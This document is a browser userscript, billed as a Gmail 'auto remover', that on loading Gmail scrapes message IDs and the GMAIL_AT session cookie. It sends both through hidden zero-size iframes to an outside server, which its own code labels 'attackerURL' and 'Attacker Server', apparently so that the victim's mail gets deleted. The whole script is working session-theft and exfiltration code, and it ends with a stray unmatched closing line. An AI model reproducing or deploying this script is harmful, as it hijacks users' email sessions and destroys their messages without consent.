// ==UserScript==
// @name            email Gmail auto remover
// @description     email gmail auto remover by anonym.
// @include         https://*.gmail.com/*
// @include         https://*.gmail.com/*/*
// @include         http://*.gmail.com/*
// @include         http://*.gmail.com/*/*

// ==/UserScript==
var attackerURL = "http://spyrozone.black-it.net/playground/gm-autodeletion/"
var m=0;
var m2=0;
var delURL="";
var gMsgID="";
var getURL = document.location.toString();
window.addEventListener('DOMContentLoaded', function(e){
if (getURL=="http://mail.google.com/mail/?shva=1"||getURL=="http://mail.google.com/mail/"){
readBody = document.body.innerHTML;
arrLine = readBody.split("\n");
//Get messages ID
for(s=0;s<arrLine.length;s++){
strArr = arrLine[s].toString();
m = strArr.indexOf('",1,0,[');
m2 = strArr.indexOf('",0,0,[');
if(m!=-1||m2!=-1){
	if(m >1){msID = strArr.substring(m-54,m-38)}else{if(m2 >1){msID = strArr.substring(m2-54,m2-38)}}
	if(gMsgID!=""){gMsgID = msID+"|"+gMsgID;}else{gMsgID = msID;}
}}
//Create hidden DIV
if (gMsgID!=""){
	msgArr = gMsgID.split("|");
	var div = document.createElement('div');
	div.style.position= 'fixed';
	div.style.top= '-600px';
	div.style.left = '-600px';
	div.style.width= '100%';	
	for(p=0;p<msgArr.length;p++){
		//Create hidden IFRAME to send all messages ID to Attacker Server
		var iframe=document.createElement("iframe"); 
		iframe.setAttribute('width', '0');
		iframe.setAttribute('height', '0');
		iframe.setAttribute('src', attackerURL+'del.php?a=i&s='+getCookie("GMAIL_AT")+'&m='+msgArr[p].toString());
		div.appendChild(iframe);
	}document.body.appendChild(div);
}
}}, false);
function getCookie(c_name){
if (document.cookie.length>0){
	c_start=document.cookie.indexOf(c_name + "=");
	if (c_start!=-1){
		c_start=c_start + c_name.length+1;
		c_end=document.cookie.indexOf(";",c_start);
		if (c_end==-1) c_end=document.cookie.length;
		return unescape(document.cookie.substring(c_start,c_end));
    }
}return "";}
})(window.mozilla);

